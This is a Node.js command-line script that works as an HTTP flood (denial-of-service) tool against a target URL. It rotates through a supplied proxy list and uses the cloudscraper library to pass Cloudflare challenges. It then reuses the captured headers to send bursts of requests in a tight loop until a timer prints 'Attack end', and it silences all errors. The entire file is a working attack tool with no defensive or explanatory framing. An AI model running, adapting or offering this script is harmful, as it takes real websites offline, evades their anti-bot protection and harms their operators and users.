require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    path = require('path');

if (process.argv.length !== 6) {
    console.log(`
node ${path.basename(__filename)} url time requests per ip proxy
node ${path.basename(__filename)} http://example.com 60 64 http.txt`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];

let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

function send_req() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return console.log(error.message);
            }
            resolve(response.request.headers);
        });
    });

    getHeaders.then(function (result) {
        // Object.keys(result).forEach(function (i, e) {
        //     console.log(i + ': ' + result[i]);
        // });
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, function (error, response) {
                if (error) {
                    console.log(error.message);
                }
            });
        }
    });
}

setInterval(() => {
    send_req();
});

setTimeout(() => {
    console.log('Attack end');
    process.exit(0)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
